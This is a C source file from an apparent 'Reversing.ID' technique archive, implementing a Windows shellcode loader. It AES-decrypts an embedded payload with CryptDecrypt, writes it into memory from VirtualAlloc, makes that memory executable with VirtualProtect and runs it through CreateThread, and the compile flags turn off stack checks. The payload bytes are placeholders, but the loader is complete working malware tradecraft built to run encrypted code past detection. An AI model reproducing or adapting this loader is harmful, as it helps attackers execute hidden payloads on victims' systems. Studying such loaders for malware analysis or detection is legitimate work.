/*
    Shellcode Loader
    Archive of Reversing.ID

    writing shellcode to allocated memory

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    AES with CryptDecrypt
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <stdint.h>
#include <stdlib.h>
#include <wincrypt.h>

#pragma comment(lib,"advapi32")

#define KEY_SIZE    32

void decrypt (uint8_t * data, uint32_t size, uint8_t key[KEY_SIZE])
{
    HCRYPTPROV  h_provider;
    HCRYPTHASH  h_hash;
    HCRYPTKEY   h_key;
    DWORD       data_len = size;
    
    CryptAcquireContext (&h_provider, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash (h_provider, CALG_SHA_512, 0, 0, &h_hash);
    CryptHashData (h_hash, key, KEY_SIZE, 0);
    CryptDeriveKey (h_provider, CALG_AES_256, h_hash, 0, &h_key);

    CryptDecrypt (h_key, 0, true, 0, data, &data_len);

    CryptDestroyKey (h_key);
    CryptDestroyHash (h_hash);
    CryptReleaseContext (h_provider, 0);
}


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x1a, 0xac, 0x57, 0xdf, 0x45, 0xf2, 0xa5, 0x25, 0xd4, 0xa4, 0x84, 0x12, 0x41, 0x68, 0x1f, 0xf8 };
    uint32_t    payload_len = 16;
    uint32_t    idx;

    uint8_t     key[] = "Reversing.ID_ShellcodeLoader1337";

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // decrypt data
    RtlMoveMemory (runtime, payload, payload_len);
    decrypt ((uint8_t*)runtime, payload_len, key);
    
    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}